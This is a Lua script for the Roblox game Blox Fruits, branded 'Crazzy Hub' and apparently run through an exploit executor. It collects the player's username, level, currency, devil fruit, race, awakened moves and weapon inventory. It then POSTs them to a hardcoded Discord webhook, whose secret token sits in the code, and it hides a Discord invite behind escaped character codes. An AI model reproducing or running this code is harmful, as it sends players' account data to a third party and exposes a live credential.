LinkHook = "https://discord.com/api/webhooks/1154658063383535626/izEZcvPGQF3YRV7hCHjrHeXqIpKDmHaNgFV_iI7D-4ifSS3bKhtGrVLi0g6nbk1VHenK"

	function Get(Rare)
		if Rare == "Common" then
			RareNumber = 0
		elseif Rare == "Uncommon" then
			RareNumber = 1
		elseif Rare == "Rare" then
			RareNumber = 2
		elseif Rare == "Legendary" then
			RareNumber = 3
		elseif Rare == "Mythical" then
			RareNumber = 4
		else
			return "Worng InPut"
		end
		local ReturnText = ""
		for i,v in pairs(game:GetService("ReplicatedStorage").Remotes["CommF_"]:InvokeServer("getInventoryWeapons")) do
			if type(v) == "table" then
				if v.Rarity then
					if tonumber(v.Rarity) == RareNumber then
						ReturnText = ReturnText .. v.Name .. "\n"
					end
				end
			end
		end
		if ReturnText ~= "" then
			return ReturnText
		else
			return "Not Have"
		end
	end

	function GetAwaken()
		ReturnText = ""
		Awakened_Z = ":x:"
		Awakened_X = ":x:"
		Awakened_C = ":x:"
		Awakened_V = ":x:"
		Awakened_F = ":x:"
		for i ,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
			if v:IsA("Tool") then
				if v.ToolTip == "Blox Fruit" then
					if v:FindFirstChild("AwakenedMoves") then
						if v.AwakenedMoves:FindFirstChild("Z") then
							Awakened_Z = ":white_check_mark:"
						end
						if v.AwakenedMoves:FindFirstChild("X") then
							Awakened_X = ":white_check_mark:"
						end
						if v.AwakenedMoves:FindFirstChild("C") then
							Awakened_C = ":white_check_mark:"
						end
						if v.AwakenedMoves:FindFirstChild("V") then
							Awakened_V = ":white_check_mark:"
						end
						if v.AwakenedMoves:FindFirstChild("F") then
							Awakened_F = ":white_check_mark:"
						end
						ReturnText = ":regional_indicator_z:"..Awakened_Z..
							"\n"..":regional_indicator_x:"..Awakened_X..
							"\n"..":regional_indicator_c:"..Awakened_C..
							"\n"..":regional_indicator_v:"..Awakened_V..
							"\n"..":regional_indicator_f:"..Awakened_F
					else
						ReturnText = "This Fruit Can't Awakened"
					end
				end
			end
		end
		for i ,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
			if v:IsA("Tool") then
				if v.ToolTip == "Blox Fruit" then
					if v:FindFirstChild("AwakenedMoves") then
						if v.AwakenedMoves:FindFirstChild("Z") then
							Awakened_Z = ":white_check_mark:"
						end
						if v.AwakenedMoves:FindFirstChild("X") then
							Awakened_X = ":white_check_mark:"
						end
						if v.AwakenedMoves:FindFirstChild("C") then
							Awakened_C = ":white_check_mark:"
						end
						if v.AwakenedMoves:FindFirstChild("V") then
							Awakened_V = ":white_check_mark:"
						end
						if v.AwakenedMoves:FindFirstChild("F") then
							Awakened_F = ":white_check_mark:"
						end
						ReturnText = ":regional_indicator_z:"..Awakened_Z..
							"\n"..":regional_indicator_x:"..Awakened_X..
							"\n"..":regional_indicator_c:"..Awakened_C..
							"\n"..":regional_indicator_v:"..Awakened_V..
							"\n"..":regional_indicator_f:"..Awakened_F
					else
						ReturnText = "This Fruit Can't Awakened"
					end
				end
			end
		end
		if ReturnText ~= "" then
			return ReturnText
		else
			return "Not Have"
		end
	end



		local Embed = {
			 ["username"] = "Crazzy Hub",
			 ["avatar_url"] = "",
			["embeds"] = {
				{
					["title"] = "Account status",
					["color"] = tonumber(00000000),
					["type"] = "rich",
					["fields"] =  {
						{
							["name"] = "Username",
							["value"] = game.Players.LocalPlayer.Name,
							["inline"] = true
						},
						{
							["name"] = "Level",
							["value"] = game:GetService("Players").LocalPlayer.Data.Level.Value,
						},
						{
							["name"] = "Beli",
							["value"] = game:GetService("Players").LocalPlayer.Data.Beli.Value,
						},
						{
							["name"] = "Fragment",
							["value"] = game:GetService("Players").LocalPlayer.Data.Fragments.Value,
						},
						{
							["name"] = "Fruit",
							["value"] = game:GetService("Players").LocalPlayer.Data.DevilFruit.Value,
						},
						{
							["name"] = "Race",
							["value"] = game:GetService("Players").LocalPlayer.Data.Race.Value,
						},
						{
							["name"] = "Awakened",
							["value"] = tostring(GetAwaken()),
						},
						{
				        ["name"] = "Common :blue_circle:",
				        ["value"] = "```sml\n"..tostring(Get("Common")).."```",
	               		},
		             	{
				        ["name"] = "Uncommon :green_circle:",
				        ["value"] = "```sml\n"..tostring(Get("Uncommon")).."```",
            			},
			            {
			        	["name"] = "Rare :yellow_circle:",
				        ["value"] = "```sml\n"..tostring(Get("Rare")).."```",
		             	},
		             	{
			         	["name"] = "Legendary :purple_circle:",
			        	["value"] = "```sml\n"..tostring(Get("Legendary")).."```",
			            },
			            {
				        ["name"] = "Mythical :red_circle:",
				        ["value"] = "```sml\n"..tostring(Get("Mythical")).."```",
			            }
					},
					["footer"] = {
						["text"] = os.date("%A".." // ".."%d".." ".."%B".." ".."%Y".." // ".."%X").." \104\116\116\112\115\58\47\47\100\105\115\99\111\114\100\46\103\103\47\110\88\110\97\81\68\87\74"
					}
				}
			},
		}
		local Data = game:GetService("HttpService"):JSONEncode(Embed)
		local Head = {["content-type"] = "application/json"}
		Send = http_request or request or HttpPost or syn.request
		local sendhook = {Url = LinkHook, Body = Data, Method = "POST", Headers = Head}
		Send(sendhook)
